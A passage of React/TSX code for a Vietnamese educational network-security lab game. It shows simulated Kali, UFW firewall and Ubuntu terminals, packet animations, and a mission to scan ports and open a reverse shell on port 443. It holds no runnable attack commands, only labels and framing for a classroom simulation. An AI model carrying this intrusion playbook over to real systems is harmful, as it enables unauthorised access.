        {/* === GÓI TIN PIXEL CHẠY TRÊN CẦU (CHỈ HIỆN KHI CÓ LƯU LƯỢNG MẠNG THẬT) === */}
        {packet.seq > 0 && packet.kind !== 'idle' && (
          <g
            key={packet.seq}
            className={`gba-pkt ${
              packet.kind === 'blocked'
                ? 'go-blocked'
                : packet.dir === 'roundtrip'
                  ? 'go-roundtrip'
                  : packet.dir === 'roundtrip-left'
                    ? 'go-roundtrip-left'
                    : packet.dir === 'left'
                      ? 'go-left'
                      : 'go-right'
            } ${packet.tone}`}
          >
            <rect x="-42" y="-12" width="84" height="24" fill="#18222e" />
            <rect x="-40" y="-10" width="80" height="20" className="gba-pkt-fill" />
            <text x="0" y="4" textAnchor="middle">
              {packet.kind === 'virus'
                ? 'VIRUS!'
                : packet.kind === 'cmd'
                  ? 'CMD!'
                  : packet.kind === 'download'
                    ? 'linpeas'
                    : packet.kind === 'shell'
                      ? 'SHELL!'
                      : packet.kind === 'blocked'
                        ? 'BLOCK!'
                        : packet.kind === 'refused'
                          ? 'RST!'
                          : packet.kind === 'scan'
                            ? 'SYN'
                            : packet.kind === 'icmp'
                              ? 'PING'
                              : 'HTTP'}
            </text>
          </g>
        )}
      </svg>
    );
  }

  function renderKaliCrt() {
    return (
      <CrtMonitorFrame
        model="KALI-CRT · 10.10.14.7"
        phosphor="green"
        statusText={`8000:${lab.httpServer ? 'ON' : 'OFF'} · 443:${lab.listener443.toUpperCase()}`}
        showClose={panel !== 'both'}
        onClose={() => setPanel('none')}
      >
        <div className="crt-log-strip">
          <span className="crt-tag">LOG</span>
          <span>{kaliEvents[kaliEvents.length - 1]?.time} — {kaliEvents[kaliEvents.length - 1]?.msg}</span>
        </div>

        <div className="crt-term" ref={kaliBoxRef} onClick={() => kaliInputRef.current?.focus()}>
          {kaliLines.map((l, idx) => (
            <div key={idx} className={`crt-line ${l.tone ?? 'normal'}`}>
              {l.cmd && (
                <div>
                  <span className="crt-prompt">{l.prompt}</span> {l.cmd}
                </div>
              )}
              <pre>{l.text}</pre>
            </div>
          ))}
          <form
            className="crt-input-row"
            onSubmit={(e: FormEvent) => {
              e.preventDefault();
              const val = kaliInput;
              setKaliInput('');
              runKali(val);
            }}
          >
            <span className="crt-prompt">{kaliPrompt}</span>
            <input
              ref={kaliInputRef}
              value={kaliInput}
              onChange={(e) => setKaliInput(e.target.value)}
              onKeyDown={(e) => handleKeyDown(e, kaliHist, kaliHi, setKaliHi, setKaliInput)}
              placeholder="Gõ lệnh Kali (vd: help)..."
              aria-label="Nhập lệnh trên màn hình CRT Kali"
              autoCapitalize="off"
              autoCorrect="off"
              spellCheck={false}
            />
            <span className="crt-caret" aria-hidden="true">█</span>
          </form>
        </div>

        <div className="crt-keys">
          {(lab.listener443 === 'connected' ? SHELL_CHIPS : KALI_CHIPS).map((c) => (
            <button
              key={c.cmd}
              type="button"
              className="crt-keycap"
              onClick={() => {
                setKaliInput(c.cmd);
                kaliInputRef.current?.focus();
              }}
            >
              + {c.label}
            </button>
          ))}
        </div>
      </CrtMonitorFrame>
    );
  }

  function renderTargetCrt() {
    return (
      <CrtMonitorFrame
        model="UBUNTU-CRT · 10.10.14.30"
        phosphor={lab.compromised ? 'red' : 'amber'}
        statusText={
          lab.compromised
            ? '⚠ PWNED · SHELL :443 ACTIVE'
            : `22:OPEN · 80:${p80.toUpperCase()} · 445:OPEN`
        }
        showClose={panel !== 'both'}
        onClose={() => setPanel('none')}
      >
        <div className="crt-log-strip">
          <span className="crt-tag">LOG</span>
          <span>{targetEvents[targetEvents.length - 1]?.time} — {targetEvents[targetEvents.length - 1]?.msg}</span>
        </div>

        <div className="crt-term" ref={targetBoxRef} onClick={() => targetInputRef.current?.focus()}>
          {targetLines.map((l, idx) => (
            <div key={idx} className={`crt-line ${l.tone ?? 'normal'}`}>
              {l.cmd && (
                <div>
                  <span className="crt-prompt">{l.prompt}</span> {l.cmd}
                </div>
              )}
              <pre>{l.text}</pre>
            </div>
          ))}
          <form
            className="crt-input-row"
            onSubmit={(e: FormEvent) => {
              e.preventDefault();
              const val = targetInput;
              setTargetInput('');
              runTarget(val);
            }}
          >
            <span className="crt-prompt">{targetPrompt}</span>
            <input
              ref={targetInputRef}
              value={targetInput}
              onChange={(e) => setTargetInput(e.target.value)}
              onKeyDown={(e) => handleKeyDown(e, targetHist, targetHi, setTargetHi, setTargetInput)}
              placeholder="Gõ lệnh Ubuntu (vd: help)..."
              aria-label="Nhập lệnh trên màn hình CRT máy mục tiêu"
              autoCapitalize="off"
              autoCorrect="off"
              spellCheck={false}
            />
            <span className="crt-caret" aria-hidden="true">█</span>
          </form>
        </div>

        <div className="crt-keys">
          {TARGET_CHIPS.map((c) => (
            <button
              key={c.cmd}
              type="button"
              className="crt-keycap"
              onClick={() => {
                setTargetInput(c.cmd);
                targetInputRef.current?.focus();
              }}
            >
              + {c.label}
            </button>
          ))}
        </div>
      </CrtMonitorFrame>
    );
  }

  function renderUfwCrt() {
    return (
      <CrtMonitorFrame
        model="UFW-CONSOLE · FIREWALL"
        phosphor="cyan"
        statusText={lab.fwBlock80 ? 'PORT 80: DENY' : 'PORT 80: ALLOW'}
        onClose={() => setPanel('none')}
      >
        <div className="crt-ufw-grid">
          <div>
            <p className="crt-sec-h">QUY TẮC TƯỜNG LỬA (INBOUND)</p>
            <div className="crt-rule-row">
              <span>22/tcp (ssh)</span>
              <span>ALLOW IN</span>
              <span className="crt-dim">MẶC ĐỊNH</span>
            </div>
            <div className="crt-rule-row">
              <span>80/tcp (http)</span>
              <span>{lab.fwBlock80 ? 'DENY IN (DROP)' : 'ALLOW IN'}</span>
              <button type="button" className="crt-keycap" onClick={() => toggleFirewall80(!lab.fwBlock80)}>
                {lab.fwBlock80 ? 'MỞ CỔNG 80' : 'CHẶN CỔNG 80'}
              </button>
            </div>
            <div className="crt-rule-row">
              <span>445/tcp (smb)</span>
              <span>ALLOW IN</span>
              <span className="crt-dim">MẶC ĐỊNH</span>
            </div>
            <p className="crt-dim" style={{ marginTop: 8 }}>
              * Outbound mở tự do → reverse shell từ Victim đi ngược ra ngoài về Kali :443 được.
            </p>
          </div>
          <div>
            <p className="crt-sec-h">NHẬT KÝ GÓI TIN QUA CẦU</p>
            <ul className="crt-ufw-logs">
              {lab.ufwLogs.map((ev, i) => (
                <li key={i}>
                  <span>[{ev.time}]</span> {ev.msg}
                </li>
              ))}
            </ul>
          </div>
        </div>
      </CrtMonitorFrame>
    );
  }

  return (
    <>
      {/* 1. Thẻ thu gọn nằm trong trang bài học */}
      <div className="sim dual-launcher gba-launcher">
        <div className="dual-head">
          <div>
            <p className="sim-title" style={{ marginBottom: 4 }}>Lab Tương tác 2 Máy: Kali ↔ Tường lửa ↔ Máy mục tiêu</p>
            <p className="muted small" style={{ margin: 0 }}>
              Mở không gian mô phỏng toàn màn hình: bấm trực tiếp vào <strong>trạm Kali</strong>, <strong>chốt UFW</strong> hoặc <strong>máy chủ Ubuntu</strong> để bật màn hình máy tính tương tác.
            </p>
          </div>
          <button type="button" className="btn primary dual-reset" onClick={() => setIsFullscreen(true)}>
            ▶ CHƠI LAB TOÀN MÀN HÌNH
          </button>
        </div>

        <SimHow
          steps={[
            'Bấm "▶ CHƠI LAB TOÀN MÀN HÌNH" để mở sơ đồ mô phỏng mạng toàn màn hình.',
            'Trên sơ đồ, bấm vào từng đối tượng (Kali, UFW, Ubuntu) để mở màn hình CRT của thiết bị đó.',
          ]}
        />

        <div
          className="dual-launcher-preview"
          onClick={() => setIsFullscreen(true)}
          role="button"
          tabIndex={0}
          onKeyDown={(e) => {
            if (e.key === 'Enter' || e.key === ' ') {
              e.preventDefault();
              setIsFullscreen(true);
            }
          }}
        >
          {renderGbaMap(false)}
          <div className="dual-launcher-overlay">
            <span>▶ BẤM ĐỂ MỞ KHÔNG GIAN MÔ PHỎNG TOÀN MÀN HÌNH ({lab.done.size}/{TASKS.length} NHIỆM VỤ)</span>
          </div>
        </div>
      </div>

      {/* 2. Không gian toàn màn hình */}
      {isFullscreen && (
        <div className="gba-stage" role="dialog" aria-modal="true" aria-label="Không gian mô phỏng mạng và màn hình máy tính tương tác">
          <div className="gba-world-wrap">
            <div className={`gba-bezel-frame ${panel === 'none' ? 'is-full' : ''}`}>
              <div className="gba-bezel-shell">
                <div className="gba-map-col">
                  {renderGbaMap(true)}
                  <div className={`gba-ticker ${packet.tone}`} aria-live="polite">
                    <span className="gba-ticker-badge">
                      {packet.dir === 'right' ? '▶▶' : packet.dir === 'left' ? '◀◀' : '◀▶'} {packet.label}
                    </span>
                    <span className="gba-ticker-txt">{packet.detail}</span>
                  </div>
                </div>

                <aside className="gba-console-dock" aria-label="Bối cảnh, nhiệm vụ và điều khiển trạm">
                  {/* Đầu game: Bối cảnh chính; khi mở 1 hoặc 2 CRT: Bảng nhiệm vụ cụ thể */}
                  <div className="gba-dock-brief">
                    {panel === 'none' ? (
                      <>
                        <p className="gba-dock-h">CHIẾN DỊCH: ĐỘT NHẬP DMZ</p>
                        <p className="gba-dock-p">
                          Nhập vai Hacker tại trạm <strong>KALI (10.10.14.7)</strong>, đối đầu chốt gác <strong>UFW</strong> để đột nhập máy chủ <strong>UBUNTU (10.10.14.30)</strong>.
                        </p>
                        <p className="gba-dock-p" style={{ marginBottom: 0 }}>
                          <strong>Mục tiêu cuối:</strong> Dò cổng mở, thử bật khiên UFW rồi đào <strong>đường hầm ngược :443</strong> chiếm toàn quyền máy đích!
                        </p>
                      </>
                    ) : (
                      <>
                        <p className="gba-dock-h">NHIỆM VỤ CỤ THỂ ({lab.done.size}/{TASKS.length})</p>
                        <ol className="gba-dock-steps">
                          {TASKS.map((t) => (
                            <li key={t.id} className={lab.done.has(t.id) ? 'is-done' : ''}>
                              {lab.done.has(t.id) ? '✓ ' : ''}{t.text}
                            </li>
                          ))}
                        </ol>
                      </>
                    )}
                  </div>

                  <div className="gba-console-btns">
                    <div className="gba-dock-row">
                      <button type="button" className={`gba-btn gba-btn-sm ${panel === 'kali' ? 'active' : ''}`} onClick={() => openNode('kali')}>
                        KALI{unread.kali > 0 ? `!${unread.kali}` : ''}
                      </button>
                      <button type="button" className={`gba-btn gba-btn-sm ${panel === 'ufw' ? 'active' : ''}`} onClick={() => openNode('ufw')}>
                        UFW{unread.ufw > 0 ? `!${unread.ufw}` : ''}
                      </button>
                      <button type="button" className={`gba-btn gba-btn-sm ${panel === 'target' ? 'active' : ''}`} onClick={() => openNode('target')}>
                        UBUNTU{unread.target > 0 ? `!${unread.target}` : ''}
                      </button>
                    </div>
                    <div className="gba-dock-row">
                      <button type="button" className={`gba-btn gba-btn-sm ${panel === 'both' ? 'active' : ''}`} onClick={toggleParallel}>
                        {panel === 'both' ? '■ 2 CRT' : '🖵 2 CRT'}
                      </button>
                      <button type="button" className="gba-btn gba-btn-sm" onClick={reset}>
                        ↺ LẠI
                      </button>
                      <button type="button" className="gba-btn gba-btn-sm gba-btn-exit" onClick={() => setIsFullscreen(false)}>
                        ✕ THOÁT
                      </button>
                    </div>
                  </div>
                </aside>
              </div>
            </div>
          </div>

          {/* Khu vực dưới: Chỉ dành cho màn hình CRT chạy lệnh */}
          <div className="gba-bottom-area">
            {panel === 'none' ? (
              <div className="gba-dialog-box">
                <div className="gba-dialog-quests">
                  <p className="gba-dialog-h">CHỌN TRẠM TRÊN BẢN ĐỒ ĐỂ MỞ CRT</p>
                  <p className="gba-brief-p">
                    Chạm vào <strong>Hacker (KALI)</strong>, <strong>Cảnh sát (UFW)</strong> hoặc <strong>Phòng máy (UBUNTU)</strong> — hoặc bấm nút bên cạnh để bắt đầu!
                  </p>
                </div>
                <div className="gba-dialog-actions">
                  <button type="button" className="gba-btn active" onClick={() => openNode('kali')}>
                    MỞ CRT KALI {unread.kali > 0 ? `(${unread.kali})` : ''}
                  </button>
                  <button type="button" className="gba-btn" onClick={() => openNode('ufw')}>
                    MỞ CRT UFW {unread.ufw > 0 ? `(${unread.ufw})` : ''}
                  </button>
                  <button type="button" className="gba-btn" onClick={() => openNode('target')}>
                    MỞ CRT UBUNTU {unread.target > 0 ? `(${unread.target})` : ''}
                  </button>
                </div>
              </div>
            ) : (
              <div className={`crt-dock ${panel === 'both' ? 'is-both' : ''}`}>
                <div className="crt-dock-main">
                  {panel === 'kali' && renderKaliCrt()}
                  {panel === 'target' && renderTargetCrt()}
                  {panel === 'ufw' && renderUfwCrt()}
                  {panel === 'both' && (
                    <div className="crt-both-grid">
                      {renderKaliCrt()}
                      {renderTargetCrt()}
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>
        </div>
      )}
    </>
  );
}
